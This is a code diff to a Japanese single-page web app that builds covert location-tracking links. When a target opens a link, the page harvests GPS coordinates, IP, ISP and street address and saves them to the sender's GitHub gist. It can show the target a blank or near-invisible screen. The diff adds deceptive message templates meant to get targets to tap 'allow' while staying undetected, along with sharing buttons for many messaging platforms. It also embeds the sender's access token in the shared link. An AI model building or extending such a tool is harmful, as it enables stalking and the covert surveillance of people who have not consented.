@@ -20,12 +20,17 @@ body{margin:0;background:var(--soft);color:var(--ink);font-family:-apple-system,
 .step{display:inline-block;width:18px;height:18px;border-radius:50%;background:#4f46e5;color:#fff;font-size:11px;line-height:18px;text-align:center;margin-right:6px}
 label{display:block;font-size:12.5px;color:var(--muted);margin-bottom:6px}
 select,input[type=text]{width:100%;padding:12px;border:1px solid var(--line);border-radius:11px;font-size:14px;font-family:inherit;background:var(--card);color:var(--ink)}
+textarea{width:100%;padding:11px 12px;border:1px solid var(--line);border-radius:10px;font-size:13px;font-family:inherit;background:var(--card);color:var(--ink);resize:vertical;line-height:1.7}
 button{font-family:inherit;cursor:pointer}
 .big{width:100%;padding:15px;border-radius:13px;border:none;background:#4f46e5;color:#fff;font-size:15px;font-weight:500}
 .big:disabled{opacity:.55}
-.btn{padding:11px 14px;border:1px solid var(--line);border-radius:10px;background:var(--card);color:var(--ink);font-size:13.5px;font-weight:500}
-.btn.line{border-color:#06c755;color:#06c755;text-decoration:none;display:inline-flex;align-items:center}
+.btn{padding:11px 14px;border:1px solid var(--line);border-radius:10px;background:var(--card);color:var(--ink);font-size:13.5px;font-weight:500;text-decoration:none;display:inline-flex;align-items:center}
+.btn.danger{border-color:#fecaca;color:#b91c1c}
+.btn.line{border-color:#06c755;color:#06c755}
+.btn.main{background:#4f46e5;color:#fff;border-color:#4f46e5}
 .btns{display:flex;gap:8px;flex-wrap:wrap;margin-top:10px;align-items:center}
+.plat{display:flex;gap:6px;flex-wrap:wrap;margin-top:8px}
+.plat .btn{padding:9px 12px;font-size:12.5px;border-radius:9px}
 .opt{display:flex;gap:11px;align-items:flex-start;border:1px solid var(--line);border-radius:12px;padding:12px;margin-bottom:8px;cursor:pointer}
 .opt:has(input:checked){border-color:#4f46e5;background:#eef2ff}
 @media(prefers-color-scheme:dark){.opt:has(input:checked){background:#1a1f2e}}
@@ -41,7 +46,7 @@ button{font-family:inherit;cursor:pointer}
 .status{font-size:13.5px;color:var(--muted)}
 .addrbox{background:#eef2ff;border:1px solid #dfe3ff;border-radius:12px;padding:14px;margin-bottom:12px}
 @media(prefers-color-scheme:dark){.addrbox{background:#1a1f2e;border-color:#2b3550}}
-.addrbox .label{font-size:11px;color:var(--acc);font-weight:500;margin-bottom:4px;margin:0 0 4px}
+.addrbox .label{font-size:11px;color:var(--acc);font-weight:500;margin:0 0 4px}
 .addr{font-size:19px;font-weight:500;line-height:1.45;word-break:break-word}
 #map,#map2,#map0{height:210px;border-radius:12px;overflow:hidden;border:1px solid var(--line);margin-bottom:12px}
 .meta{width:100%;border-collapse:collapse;font-size:12.5px}
@@ -61,6 +66,7 @@ details pre{white-space:pre-wrap;word-break:break-all;font-size:11px;background:
 .hist.on{border-color:#4f46e5}
 .hist b{font-size:13.5px;font-weight:500}
 .hist small{display:block;color:var(--muted);font-size:11px}
+.delx{padding:6px 10px;border:1px solid #fecaca;color:#b91c1c;background:transparent;border-radius:8px;font-size:11.5px;font-weight:500}
 .box{border:1px solid var(--line);border-radius:12px;padding:12px;margin-top:10px}
 .box .t{font-size:12px;color:var(--muted);margin-bottom:6px}
 #recvMini{font-size:11.5px;color:var(--muted);padding:8px 2px;cursor:pointer;user-select:none}
@@ -88,34 +94,55 @@ var UI=`
     <h2><span class="step">1</span>誰に送る？（任意）</h2>
     <input id="name" type="text" placeholder="例：田中">
    </div>
-
    <div class="card">
     <h2><span class="step">2</span>相手の画面に何を出す？</h2>
     <label class="opt"><input type="radio" name="sty" value="min" checked><span><b>極小</b><small>小さな点と一言だけ。ほぼ気づかれない</small></span><span class="demo">● 確認しました</span></label>
     <label class="opt"><input type="radio" name="sty" value="blank"><span><b>真っ白</b><small>何も表示しない。完全に無言</small></span><span class="demo">（空白）</span></label>
     <label class="opt"><input type="radio" name="sty" value="normal"><span><b>ふつう</b><small>住所と地図をドーンと表示</small></span><span class="demo">住所＋地図</span></label>
    </div>
-
    <div class="card">
     <h2><span class="step">3</span>精度は？</h2>
     <label class="sw"><input type="checkbox" id="useGps" checked><span><b>正確な位置まで取る（おすすめ）</b><small>番地レベル。ただし初回だけ相手に「許可？」が出ます</small></span></label>
     <p class="hint">OFFにすると市区町村レベル（ダイアログ一切なし）</p>
    </div>
-
    <button id="mk" class="big">リンクを作る</button>
 
    <div id="out" class="hidden">
     <div id="mkStatus" class="hint"></div>
+
     <div class="box">
-     <div class="t">これを相手に送る</div>
-     <input id="sendLink" readonly>
+     <div class="t">送る文面（自由に編集OK）</div>
+     <select id="tpl">
+      <option value="0">かんたん（押させる率 重視）</option>
+      <option value="1">理由つき（納得感）</option>
+      <option value="2">控えめ（バレにくい）</option>
+      <option value="3">かっちり（仕事向け）</option>
+      <option value="4">ほぼ無言（最小限）</option>
+      <option value="5">文面なし（リンクだけ）</option>
+     </select>
+     <div style="height:8px"></div>
+     <textarea id="msg" rows="5"></textarea>
      <div class="btns">
-      <a id="lineSend" class="btn line" target="_blank" rel="noopener">LINEで送る</a>
+      <button id="share" class="btn main">共有（Discordなど何でも）</button>
       <button id="cpSend" class="btn">コピー</button>
      </div>
+     <div class="plat">
+      <a id="lineSend" class="btn line" target="_blank" rel="noopener">LINE</a>
+      <a id="xSend" class="btn" target="_blank" rel="noopener">X</a>
+      <a id="mailSend" class="btn">メール</a>
+      <a id="smsSend" class="btn">SMS</a>
+      <a id="waSend" class="btn" target="_blank" rel="noopener">WhatsApp</a>
+      <a id="tgSend" class="btn" target="_blank" rel="noopener">Telegram</a>
+     </div>
+     <p class="hint">「共有」を押すと端末の共有シートが開きます。Discord・Instagram・Slack・Messengerなどはそこから。</p>
+    </div>
+
+    <div class="box">
+     <div class="t">リンクだけ（文面を使わない時）</div>
+     <input id="sendLink" readonly>
     </div>
     <div class="box">
-     <div class="t">結果を見るリンク（別の端末で見たい時用）</div>
+     <div class="t">結果を見るリンク（別の端末用）</div>
      <input id="viewLink" readonly>
      <div class="btns"><button id="cpView" class="btn">コピー</button></div>
     </div>
@@ -133,10 +160,14 @@ var UI=`
      <table class="meta" id="vmeta"></table>
      <p class="hint" id="vwhen"></p>
     </div>
-    <div class="btns"><button id="refresh" class="btn">更新</button></div>
+    <div class="btns">
+     <button id="refresh" class="btn">更新</button>
+     <button id="del" class="btn danger">このリンクを停止</button>
+    </div>
+    <p class="hint">停止すると保存先が削除され、以後そのリンクは記録されなくなります。</p>
    </div>
    <div class="card">
-    <h2>履歴</h2>
+    <h2>履歴（タップで表示）</h2>
     <div id="histList"></div>
    </div>
   </div>
@@ -194,8 +225,21 @@ function logline(s){LOG.push(s);var d=$("diagPre");if(d)d.textContent=LOG.join("
 function esc(s){return String(s==null?"":s).replace(/[&<>"]/g,function(c){return {"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]})}
 function show(i){$(i).classList.remove("hidden")}
 function hide(i){$(i).classList.add("hidden")}
-function lineUrl(t){return "https://line.me/R/msg/text/?"+encodeURIComponent(t)}
 function J(t){try{return JSON.parse(t)}catch(e){return null}}
+function copyText(t,btn){
+ var done=function(){if(!btn)return;var o=btn.textContent;btn.textContent="コピーしました";setTimeout(function(){btn.textContent=o},1400)};
+ if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(t).then(done).catch(fb)}else fb();
+ function fb(){var ta=document.createElement("textarea");ta.value=t;ta.style.position="fixed";ta.style.opacity="0";document.body.appendChild(ta);ta.select();try{document.execCommand("copy")}catch(e){}document.body.removeChild(ta);done()}
+}
+
+var TPL=[
+ "これ開いてみて！「位置情報を許可しますか？」って出たら「許可」押しといて〜",
+ "待ち合わせ用にこれ送るね。開いたら「許可」って出るから、そこだけ押しといて！",
+ "これ開いてみて。なんか出たら「許可」でいいよ〜",
+ "共有リンクです。開いていただき、位置情報の許可をお願いします。",
+ "これ開くだけでOK。位置情報の「許可」だけ押してね。",
+ ""
+];
 
 var proxyState=null;
 function px(u){return location.origin+"/sandbox/proxy?url="+encodeURIComponent(u)}
@@ -206,7 +250,7 @@ function raw(method,url,opts){
   try{x.open(method,url,true)}catch(e){rej(e);return}
   if(opts.headers)for(var k in opts.headers){try{x.setRequestHeader(k,opts.headers[k])}catch(e){}}
   x.timeout=opts.timeout||20000;
-  x.onload=function(){res({ok:x.status>=200&&x.status<300,status:x.status,text:x.responseText,loc:x.getResponseHeader("Location")})};
+  x.onload=function(){res({ok:x.status>=200&&x.status<300,status:x.status,text:x.responseText})};
   x.onerror=function(){rej(new Error("network error"))};
   x.ontimeout=function(){rej(new Error("timeout"))};
   try{x.send(opts.body!=null?opts.body:null)}catch(e){rej(e)}
@@ -258,17 +302,14 @@ function drawMap(cid,lat,lon,z){
 
 var TOKEN=localStorage.getItem("loclink_tok")||"";
 var HIST=J(localStorage.getItem("loclink_hist")||"[]")||[];
-
+var curId=null,curLink="",curTplText="";
 var GH="https://api.github.com/gists";
 function ghH(){return{"Content-Type":"application/json","Authorization":"Bearer "+TOKEN}}
 async function createBlob(data){
- var j=JSON.stringify(data);
  if(!TOKEN)return null;
- var r=await req("POST",GH,{headers:ghH(),body:JSON.stringify({description:"loclink",public:false,files:{"loc.json":{content:j}}}),timeout:20000});
- var o=J(r.text);
- if(!r.ok||!o||!o.id)throw new Error("HTTP "+r.status+(o&&o.message?" "+o.message:""));
- logline("Gist作成 OK");
- return o.id;
+ var r=await req("POST",GH,{headers:ghH(),body:JSON.stringify({description:"loclink",public:false,files:{"loc.json":{content:JSON.stringify(data)}}}),timeout:20000});
+ var o=J(r.text);if(!r.ok||!o||!o.id)throw new Error("HTTP "+r.status);
+ logline("Gist作成 OK");return o.id;
 }
 async function writeBlob(id,data){
  var r=await req("PATCH",GH+"/"+id,{headers:ghH(),body:JSON.stringify({files:{"loc.json":{content:JSON.stringify(data)}}}),timeout:20000});
@@ -277,34 +318,70 @@ async function writeBlob(id,data){
 async function readBlob(id){
  var r=await req("GET",GH+"/"+id,{timeout:15000});
  if(!r.ok)throw new Error("HTTP "+r.status);
- var o=J(r.text);
- var c=o&&o.files&&o.files["loc.json"]&&o.files["loc.json"].content;
+ var o=J(r.text),c=o&&o.files&&o.files["loc.json"]&&o.files["loc.json"].content;
  return c?J(c):null;
 }
+async function deleteBlob(id){
+ var r=await req("DELETE",GH+"/"+id,{headers:ghH(),timeout:15000});
+ if(!r.ok&&r.status!==404)throw new Error("HTTP "+r.status);
+}
 
-// タブ
-var curTab="send";
+function buildMsg(){
+ curTplText=TPL[+$("tpl").value];
+ $("msg").value = curTplText ? (curTplText+"\n"+curLink) : curLink;
+ syncSend();
+}
+function syncSend(){
+ var t=$("msg").value, e=encodeURIComponent(t);
+ $("lineSend").href="https://line.me/R/msg/text/?"+e;
+ $("xSend").href="https://twitter.com/intent/tweet?text="+e;
+ $("mailSend").href="mailto:?subject="+encodeURIComponent("位置確認")+"&body="+e;
+ $("smsSend").href="sms:&body="+e;
+ $("waSend").href="https://wa.me/?text="+e;
+ $("tgSend").href="https://t.me/share/url?url="+encodeURIComponent(curLink)+"&text="+encodeURIComponent(curTplText||"");
+}
+function doShare(){
+ var t=$("msg").value;
+ if(navigator.share){
+  navigator.share({text:t}).catch(function(e){ if(e&&e.name==="AbortError")return; copyText(t,$("cpSend")); });
+ } else {
+  copyText(t,$("cpSend"));
+  alert("この環境では共有シートが使えないのでコピーしました。貼り付けて送ってください。");
+ }
+}
+
 function tab(t){
- curTab=t;
  [].forEach.call(document.querySelectorAll(".tab"),function(b){b.classList.toggle("on",b.getAttribute("data-t")===t)});
- hide("tab-send");hide("tab-res");hide("tab-set");
- show("tab-"+t);
+ hide("tab-send");hide("tab-res");hide("tab-set");show("tab-"+t);
  if(t==="res")renderHist();
 }
 [].forEach.call(document.querySelectorAll(".tab"),function(b){b.onclick=function(){tab(b.getAttribute("data-t"))}});
 
-// 履歴
 function renderHist(){
  var box=$("histList");
  if(!HIST.length){box.innerHTML='<p class="hint">まだリンクを作っていません。</p>';return}
  box.innerHTML=HIST.map(function(h,i){
-  return '<div class="hist'+(h.id===curId?" on":"")+'" data-i="'+i+'"><span><b>'+esc(h.name||"（名前なし）")+'</b><small>'+new Date(h.at).toLocaleString("ja-JP")+'</small></span></div>';
+  return '<div class="hist'+(h.id===curId?" on":"")+'" data-i="'+i+'"><span style="flex:1"><b>'+esc(h.name||"（名前なし）")+'</b><small>'+new Date(h.at).toLocaleString("ja-JP")+'</small></span><button class="delx" data-d="'+i+'">停止</button></div>';
  }).join("");
  [].forEach.call(box.querySelectorAll(".hist"),function(el){
   el.onclick=function(){var h=HIST[+el.getAttribute("data-i")];curId=h.id;renderHist();loadResult(h.id)};
  });
+ [].forEach.call(box.querySelectorAll(".delx"),function(el){
+  el.onclick=function(ev){ev.stopPropagation();stopLink(HIST[+el.getAttribute("data-d")].id)};
+ });
 }
-var curId=null;
+function removeHist(id){
+ HIST=HIST.filter(function(h){return h.id!==id});
+ localStorage.setItem("loclink_hist",JSON.stringify(HIST));
+ if(curId===id){curId=null;hide("vResult");$("vStatus").textContent="停止しました";}
+ renderHist();
+}
+async function stopLink(id){
+ if(!id){$("vStatus").textContent="対象のリンクがありません";return}
+ if(!confirm("このリンクを停止しますか？（保存先を削除します。記録済みの住所も消えます）"))return;
+ try{await deleteBlob(id)}catch(e){alert("停止に失敗: "+e.message);return}
+ logline("停止: "+id);removeHist(id);
+}
 
 function getPos(hi,ms){return new Promise(function(res,rej){navigator.geolocation.getCurrentPosition(res,rej,{enableHighAccuracy:hi,timeout:ms,maximumAge:0})})}
 async function refine(cid,addrEl,srcEl,cur,cb){
@@ -326,20 +403,26 @@ async function refine(cid,addrEl,srcEl,cur,cb){
 function startHome(){
  show("viewHome");document.title="リンクで住所特定";
  if(TOKEN)$("tok").value=TOKEN;
- if(!TOKEN)$("tokState").innerHTML='<span class="err">未設定</span>';else $("tokState").innerHTML='<span class="okmsg">設定済み</span>';
+ $("tokState").innerHTML=TOKEN?'<span class="okmsg">設定済み</span>':'<span class="err">未設定</span>';
  $("saveTok").onclick=async function(){
   var v=$("tok").value.trim();
   if(!v){localStorage.removeItem("loclink_tok");TOKEN="";$("tokState").textContent="消しました";return}
   $("tokState").innerHTML='<span class="spin"></span>確認中…';
   try{
    var r=await req("GET","https://api.github.com/user",{headers:{"Authorization":"Bearer "+v},timeout:15000});
-   if(r.ok){var o=J(r.text);localStorage.setItem("loclink_tok",v);TOKEN=v;$("tokState").innerHTML='<span class="okmsg">OK: @'+esc(o.login||"")+'</span>';logline("トークン OK @"+(o.login||""))}
+   if(r.ok){var o=J(r.text);localStorage.setItem("loclink_tok",v);TOKEN=v;$("tokState").innerHTML='<span class="okmsg">OK: @'+esc(o.login||"")+'</span>'}
    else $("tokState").innerHTML='<span class="err">無効（HTTP '+r.status+'）</span>';
   }catch(e){$("tokState").innerHTML='<span class="err">'+esc(e.message)+'</span>'}
  };
  $("mk").onclick=makeLink;
+ $("tpl").onchange=buildMsg;
+ $("msg").oninput=syncSend;
+ $("share").onclick=doShare;
+ $("cpSend").onclick=function(){copyText($("msg").value,this)};
+ $("cpView").onclick=function(){copyText($("viewLink").value,this)};
  $("test").onclick=function(){logline("--- テスト ---");createBlob({test:1}).then(function(id){logline(id?"テスト OK":"トークン未設定")}).catch(function(e){logline("テスト失敗: "+e.message)})};
  $("refresh").onclick=function(){if(curId)loadResult(curId)};
+ $("del").onclick=function(){stopLink(curId)};
 
  var cur={};
  (async function(){
@@ -360,15 +443,14 @@ function makeLink(){
   var id;
   try{id=await createBlob({waiting:true,at:Date.now()})}
   catch(e){$("mkStatus").innerHTML='<span class="err">作成失敗: '+esc(e.message)+'</span>';self.disabled=false;self.textContent="リンクを作る";return}
-  if(!id){$("mkStatus").innerHTML='<span class="err">トークンが未設定です（設定タブ）</span>';self.disabled=false;self.textContent="リンクを作る";return}
-  var sendU=base+"#n="+encodeURIComponent(name)+"&r="+id+"&v="+sty+g+(TOKEN?"&t="+encodeURIComponent(TOKEN):"");
-  var viewU=base+"#r="+id;
-  $("sendLink").value=sendU;$("viewLink").value=viewU;
-  $("lineSend").href=lineUrl(sendU);
+  if(!id){$("mkStatus").innerHTML='<span class="err">トークン未設定（設定タブ）</span>';self.disabled=false;self.textContent="リンクを作る";return}
+  curLink=base+"#n="+encodeURIComponent(name)+"&r="+id+"&v="+sty+g+(TOKEN?"&t="+encodeURIComponent(TOKEN):"");
+  $("sendLink").value=curLink;$("viewLink").value=base+"#r="+id;
+  buildMsg();
   HIST.unshift({id:id,name:name,at:Date.now()});HIST=HIST.slice(0,20);
   localStorage.setItem("loclink_hist",JSON.stringify(HIST));
   curId=id;
-  $("mkStatus").innerHTML='<span class="okmsg">できました。LINEで送ってください。</span>';
+  $("mkStatus").innerHTML='<span class="okmsg">できました。下のボタンから送ってください。</span>';
   self.disabled=false;self.textContent="作り直す";
  })();
 }
@@ -376,7 +458,7 @@ function makeLink(){
 var vt=null,vc=0;
 async function loadResult(id){
  if(!id)return;
- vc=0;if(vt)clearInterval(vt);
+ vc=0;if(vt){clearInterval(vt);vt=null}
  show("vStatus");$("vStatus").innerHTML='<span class="pulse"></span>読み込み中…';hide("vResult");
  var once=async function(){
   vc++;
@@ -418,7 +500,7 @@ function startRecv(){
     if(!R)return;
     writeBlob(R,{lat:cur.lat,lon:cur.lon,ip:cur.ip,city:cur.city,region:cur.region,country:cur.country,postal:cur.postal,isp:cur.isp,tz:cur.tz,addr:cur.addr||a,acc:cur.acc||"ip",acc_m:cur.acc_m||0,at:Date.now()})
      .then(function(){$("recvSend").textContent=cur.acc==="gps"?"（GPSで保存しました）":"（自動で保存しました）"})
-     .catch(function(e){$("recvSend").innerHTML='<span class="err">保存に失敗: '+esc(e.message)+'</span>'});
+     .catch(function(e){$("recvSend").innerHTML=/404/.test(e.message)?'<span style="color:var(--muted)">（このリンクは終了しています）</span>':'<span class="err">保存に失敗: '+esc(e.message)+'</span>'});
    }
    save();
    var doGps=function(){
@@ -438,11 +520,7 @@ function startRecv(){
 
 var hp0=new URLSearchParams(location.hash.replace(/^#/,""));
 if(hp0.get("n"))startRecv();
-else{
- startHome();
- var r0=hp0.get("r");
- if(r0){curId=r0;tab("res");loadResult(r0)}
-}
+else{startHome();var r0=hp0.get("r");if(r0){curId=r0;tab("res");loadResult(r0)}}
 })();
 </script>
 </body>
